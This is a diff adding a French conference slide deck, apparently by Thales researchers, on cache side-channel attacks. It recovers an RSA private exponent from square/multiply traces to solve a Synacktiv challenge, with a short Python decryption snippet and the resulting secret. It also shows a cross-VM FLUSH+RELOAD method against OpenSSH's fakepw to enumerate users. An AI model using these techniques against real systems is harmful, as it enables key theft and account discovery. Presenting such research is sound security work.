+                            data: getdata(),  // random generator below
+
+                        });
+
+                        chart.render();
+                    });
+                    </script>
+                    <div style="margin: auto; clear: all; height: 300px; width: 800px; border: 1px solid black;">
+                        <div id="chartContainer" style="text-align: center;">TODO: Uncomment data.js</div>
+                    </div>
+                </section>
+
+                <section>
+                    <h3>Extraction des bits de l'exposant privé</h3>
+                    <script type="text/javascript">
+                    $(document).ready(function () {
+                        var chart = new CanvasJS.Chart("chartContainer2",
+                        {
+                            zoomEnabled: false,
+                            panEnabled: true,
+                            showInLegend: true,
+                            backgroundColor: "rgba(255, 255, 255, 0.3)",
+                            height: 300,
+                            width: 800,
+                            title:{
+                                text: "Hits"
+                            },
+                            legend: {
+                                horizontalAlign: "right",
+                                verticalAlign: "center"
+                            },
+                            axisX:{
+                                title: "Mesures",
+                            },
+                            axisY:{
+                                interval:1,
+                                valueFormatString: " ",
+                            },
+                            toolTip:{
+                                enabled: false
+                            },
+                            data: getdata2(),  // random generator below
+
+                        });
+
+                        chart.render();
+                    });
+                    </script>
+                    <div style="margin: auto; clear: all; height: 300px; width: 800px; border: 1px solid black;">
+                        <div id="chartContainer2" style="text-align: center;">TODO: Uncomment data2.js</div>
+                    </div>
+                    <div style="color: white; text-shadow: 1px 1px #000; background-color: red; opacity: 0.5; position: absolute; top: 36%; left: 10.5%; width: 105px; height: 194px; font-size: 30px; border: 3px solid black;" class="fragment">
+                        Square<br >Multipy<br /><br /><span style="font-size: 50px;">1</span>
+                    </div>
+                    <div style="color: white; text-shadow: 1px 1px #000; background-color: red; opacity: 0.5; position: absolute; top: 36%; left: 21.9%; width: 105px; height: 194px; font-size: 30px; border: 3px solid black;" class="fragment">
+                        Square<br >Multipy<br /><br /><span style="font-size: 50px;">1</span>
+                    </div>
+                    <div style="color: white; text-shadow: 1px 1px #000; background-color: blue; opacity: 0.5; position: absolute; top: 36%; left: 33.3%; width: 50px; height: 194px; font-size: 30px; border: 3px solid black;" class="fragment">
+                        &nbsp;<br >&nbsp;<br /><br /><span style="font-size: 50px;">0</span>
+                    </div>
+                    <div style="color: white; text-shadow: 1px 1px #000; background-color: red; opacity: 0.5; position: absolute; top: 36%; left: 39%; width: 105px; height: 194px; font-size: 30px; border: 3px solid black;" class="fragment">
+                        Square<br >Multipy<br /><br /><span style="font-size: 50px;">1</span>
+                    </div>
+                    <div style="color: white; text-shadow: 1px 1px #000; background-color: red; opacity: 0.5; position: absolute; top: 36%; left: 50.3%; width: 105px; height: 194px; font-size: 30px; border: 3px solid black;" class="fragment">
+                        Square<br >Multipy<br /><br /><span style="font-size: 50px;">1</span>
+                    </div>
+                    <div style="color: white; text-shadow: 1px 1px #000; background-color: blue; opacity: 0.5; position: absolute; top: 36%; left: 61.7%; width: 50px; height: 194px; font-size: 30px; border: 3px solid black;" class="fragment">
+                        &nbsp;<br >&nbsp;<br /><br /><span style="font-size: 50px;">0</span>
+                    </div>
+                    <div style="color: white; text-shadow: 1px 1px #000; background-color: blue; opacity: 0.5; position: absolute; top: 36%; left: 67.3%; width: 50px; height: 194px; font-size: 30px; border: 3px solid black;" class="fragment">
+                        &nbsp;<br >&nbsp;<br /><br /><span style="font-size: 50px;">0</span>
+                    </div>
+                    <div style="color: white; text-shadow: 1px 1px #000; background-color: red; opacity: 0.5; position: absolute; top: 36%; left: 72.9%; width: 105px; height: 194px; font-size: 30px; border: 3px solid black;" class="fragment">
+                        Square<br >Multipy<br /><br /><span style="font-size: 50px;">1</span>
+                    </div>
+                    <aside class="notes">
+                    <ul>
+                    	<li>Note : plein de click</li>
+                    	<li>Square suivi par multiply : 1</li>
+                    	<li>Multipy seul : 0</li>
+                    	<li>Reconstruction de l'exposant privé</li>
+                    	<li>parsing auto des resultats</li>
+                    </ul>
+                    </aside>
+                </section>
+
+                <section>
+                    <h3>Reconstruction de l'exposant privé</h3>
+                    <ul>
+                        <li class="fragment">Bits inversés : consommés par l'exponentiation modulaire par la fin</li>
+                        <li class="fragment">Plusieurs tentatives : résultats différents</li>
+                        <li class="fragment">Un résultat se démarque dans 20% des cas, c'est l'exposant privé</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h3>Rappel : message dans l'archive</h3>
+                    <pre><code data-trim class="nohighlight">
+securedrop/archive/messages</span>
+</code></pre>
+<pre><code data-trim class="nohighlight">
+$ cat archive/messages 
+new message:
+0C849AFE0A7C11B2F083C32E7FDB0F8AC03198D84D9990B26D6443B1D185A36A235A561
+BB99FE897858371311B2AD6DFE75E199667637EDEA7B9C14A158A5F6FFE15A1C14DAD80
+8FDC9F846530EDD4FE3E86F4F98571CD45F11190ED531FC940D62C2C2E05F9977223580
+8097763157F140FE4A57DB6AD902D9962F12BDFC1547CED3E282604255B2A5331373CAE
+E557CC825DD6A03C3D2D7B106E4AD15347BCB5067BDC60376FF1CC133F2C14
+9d41dbb8da10b66cdde844f62e9cc4f96c3a88730b7b8307810cf1906935123f97ac9b6
+82dd401512d18775bd7bd9b8b40929f5b4a1871ba44c94038793f0aa639b9d71d72d2ac
+cfcc95671c77a5c1c32bc813b048f5dcb1f08b59d6a7afb3b34462ac6abb69cb70accb2
+4d78389a1777c5244b8063c542cc1f6c6db8d41d32df2e7132e21db8a1cc711c1a97c51
+ba29f1d1ac8fa901a902b2a987f0764734f8b8cd2d476200e7ae62a424e2930d8b02940
+9d0e5e13d4e11f4b5f5cc1263f41b500b4340b8641465bbc56c64a575f0ee215d02dea3
+d75552328cf5742c
+</code></pre>
+<p>Ligne 1 : Clef AES chiffrée RSA<br />Ligne 2 : Message chiffré AES</p>
+                    <aside class="notes">
+                    <ul>
+                    	<li>Deux Lignes</li>
+                    	<li>1 - Clé AES chiffrée en RSA</li>
+                    	<li>exposant privée connu par cache attack</li>
+                    	<li>2 - Message chiffrée AES</li>
+                    </ul>
+                    </aside>
+                </section>
+
+                <section>
+                    <h3>Déchiffrement de la clef AES</h3>
+                    <pre><code data-trim class="python">
+# Inversion des bits, conversion en entier de "d"
+d = int(d_binary[::-1],2)
+# Conversion en entier de la clef chiffré depuis le message chiffré
+encrypted_aes_key = int(encrypted,16)
+# Operation de déchiffrement RSA
+key_value = pow(encrypted_aes_key, d, n)
+# Key : conversion depuis un entier
+key = '%0x' % (key_value)
+# Suppression du padding PKCS1 v1.5
+print key[-32:]
+                    </code></pre>
+                    <aside class="notes">
+                    <ul>
+                    	<li>On ne travail qu'avec des entiers d et le message chiffrée sont converis</li>
+                    	<li>Déchiffrement RSA => meme operation que celle observée par la cache attack : exp_mod</li>
+                    	<li>Clair paddé en PKCS1 v1.5</li>
+                    </ul>
+                    </aside>
+                </section>
+
+                <section>
+                    <h3>Déchiffrement du message</h3>
+                    <h4>Simple opération AES avec la clef retrouvée</h4>
+                    <pre><code data-trim class="nohighlight">
+$ python2 decrypt_msg.py
+Good job! 
+Send the secret 3fcba5e1dbb21b86c31c8ae490819ab6 to 
+    82d6e1a04a8ca30082e81ad27dec7cb4@synacktiv.com.      
+Also, don't forget to send us your solution within 10 days.
+Synacktiv team
+                    </code></pre>
+                </section>
+
+
+                <section>
+                    <h3>In the real world...</h3>
+                    <div class="fragment">Exemple : bruteforce des utilisateurs dans OpenSSH</div>
+                    <div class="fragment">Cache attack inter VM</div>
+                </section>
+
+                <section>
+                    <h3>Hyperviseur avec déduplication de mémoire</h3>
+                    <ul>
+                        <li class="fragment">KVM : Kernel-based Virtual Machine</li>
+                        <li class="fragment">KSM : Kernel Samepage Merging</li>
+                        <li class="fragment">Combinaison par défaut sur certaines distributions dédiées à la virtualisation</li>
+                    </ul>
+                    <aside class="notes">
+                    <ul>
+                    	<li>KVM : Qemu avec accéleration matérielle</li>
+                    </ul>
+                    </aside>
+                </section>
+
+                <section data-transition="none">
+                    <h3>Kernel Same page Merging</h3>
+                    <img data-src="./images/ksm1.svg" />
+                    <aside class="notes">
+                    <ul>
+                    	<li>Memoire virtuelle à chaque VM</li>
+                    	<li>Au debut toutes les page sont en memoire physique</li>
+                    </ul>
+                    </aside>
+                </section>
+                <section data-transition="none">
+                    <h3>Kernel Same page Merging</h3>
+                    <img data-src="./images/ksm2.svg" />
+                    <aside class="notes">
+                    <ul>
+                    	<li>Avec KSM</li>
+                    	<li>Un process KERNEL analyse les page</li>
+                    	<li>Recherche des page au contenues identiques</li>
+                    </ul>
+                    </aside>
+                </section>
+                <section data-transition="none">
+                    <h3>Kernel Same page Merging</h3>
+                    <img data-src="./images/ksm3.svg" />
+                    <aside class="notes">
+                    <ul>
+                    	<li>Lorsque une page identique est identifié</li>
+                    </ul>
+                    </aside>
+                </section>
+                <section data-transition="none">
+                    <h3>Kernel Same page Merging</h3>
+                    <img data-src="./images/ksm4.svg" />
+                    <aside class="notes">
+                    <ul>
+                    	<li>Il fait pointer les page virtuelle vers la meme page pour gagner de l'espace mémoire</li>
+                    </ul>
+                    </aside>
+                </section>
+                <section data-transition="none">
+                    <h3>Kernel Same page Merging</h3>
+                    <img data-src="./images/ksm5.svg" />
+                </section>
+                <section data-transition="none">
+                    <h3>Kernel Same page Merging</h3>
+                    <img data-src="./images/ksm6.svg" />
+                    <aside class="notes">
+                    <ul>
+                    	<li>Meme page = L3 partagé entre 2 VM</li>
+                    	<li>Dans notre exemple : sshd est dans des page dédupliqué</li>
+                    	<li>on peut donc jouer la cache attack sur le code de openssh</li>
+                    	<li>Quelle adresse surveiller ?</li>
+                    </ul>
+                    </aside>
+                </section>
+
+
+                <section>
+                    <h3>L'utilisateur inexistant existe !</h3>
+
+                    <pre><code data-trim class="c">
+if (authctxt->pw && strcmp(service, "ssh-connection")==0) {
+  authctxt->valid = 1;
+  debug2("input_userauth_request: setting up authctxt for %s", user);
+} else {
+    logit("input_userauth_request: invalid user %s", user);
+    authctxt->pw = fakepw();
+}
+                    </code></pre>
+                    <pre><code data-trim class="c">
+struct passwd *
+fakepw(void)
+{
+  static struct passwd fake;
+  
+  memset(&fake, 0, sizeof(fake));
+  fake.pw_name = "NOUSER";
+  fake.pw_passwd = "$2a$06$r3.
+    juUaHZDlIbQaO2dS9FuYxL1W9M81R1Tc92PoSNmzvpEqLkLGrK";
+  fake.pw_uid = privsep_pw == NULL ? (uid_t)-1 : privsep_pw->pw_uid;
+  fake.pw_gid = privsep_pw == NULL ? (gid_t)-1 : privsep_pw->pw_gid;
+  fake.pw_dir = "/nonexist";
+  fake.pw_shell = "/nonexist";
+  
+  return (&fake);
+}
+                    </code></pre>
+                    <aside class="notes">
+                    <ul>
+                    	<li>Pour luter contre les timing attack</li>
+                    	<li>Lorsque un utilisateur n'existe pas</li>
+                    	<li>Utilisation d'un user invalide</li>
+                    	<li>=> fonction fakepw en charge</li>
+                    	<li>On peut la surveiller</li>
+                    </ul>
+                    </aside>
+                </section>
+                <section>
+                    <h3>Test de la présence d'un utilisateur</h3>
+                    <ul>
+                        <li class="fragment">Chargement du binaire sshd en mémoire (mmap)</li>
+                        <li class="fragment">Création d'un thread de monitoring</li>
+                        <ul>
+                            <li class="fragment">FLUSH+RELOAD sur l'adresse fakepw (offset dans sshd)</li>
+                        </ul>
+                        <li class="fragment">En parallèle : Connexion à la VM avec libssh2</li>
+                        <ul>
+                            <li class="fragment" style="color: red;">HIT sur fakepw : utilisateur inexistant</li>
+                            <li class="fragment" style="color: green;">MISS sur fakepw : utilisateur existant</li>
+                        </ul>
+                    </ul>
+                </section>
+
+                <section>
+                    <h3>D&Eacute;MO</h3>
+                    <pre><code class="bash">user@vm1 $ ./ssh_user_bruteforcer
+
+
+
+
+
+
+
+
+
+
+
+
+
+                    </code></pre>
+                </section>
+
+                <section>
+                    <h3>Merci de votre attention !</h3>
+                    <h3>Questions</h3>
+                    <div style="font-size: 300px">?</div>
+                    <div>
+                        david.berard@thalesgroup.com<br />
+                        vincent.fargues@thalesgroup.com
+                    </div>
+                </section>
+            </div>
+
+        </div>
+
+        <script src="./reveal.js/lib/js/head.min.js"></script>
+        <script src="./reveal.js/js/reveal.js"></script>
+        <script src="./mscgen_js/mscgen-inpage.js"></script>
+        <script type="text/javascript" src="./js/data.js"></script>
+        <script type="text/javascript" src="./js/data2.js"></script>
+        <script type="text/javascript" src="./js/canvasjs.min.js"></script>
+</script>
+
+        <script>
+            Reveal.initialize({
+                controls: true,
+                progress: true,
+                history: true,
+                center: true,
+                slideNumber: true,
+                transition: 'fade', // none/fade/slide/convex/concave/zoom
+                backgroundTransition: 'default',
+                // Optional reveal.js plugins
+                dependencies: [
+                    { src: './reveal.js/lib/js/classList.js', condition: function() { return !document.body.classList; } },
+                    { src: './reveal.js/plugin/highlight/highlight.js', async: true, condition: function() { return !!document.querySelector( 'pre code' ); }, callback: function() { hljs.initHighlightingOnLoad(); } },
+                    { src: './reveal.js/plugin/zoom-js/zoom.js', async: true },
+                    { src: './plugin/notes/notes.js', async: true },
+                    { src: './socket.io/socket.io.js', async: true },
+                    { src: './plugin/notes-server/client.js', async: true },
+                ]
+            });
+        </script>
+
+    </body>
+</html>
+
+</html>
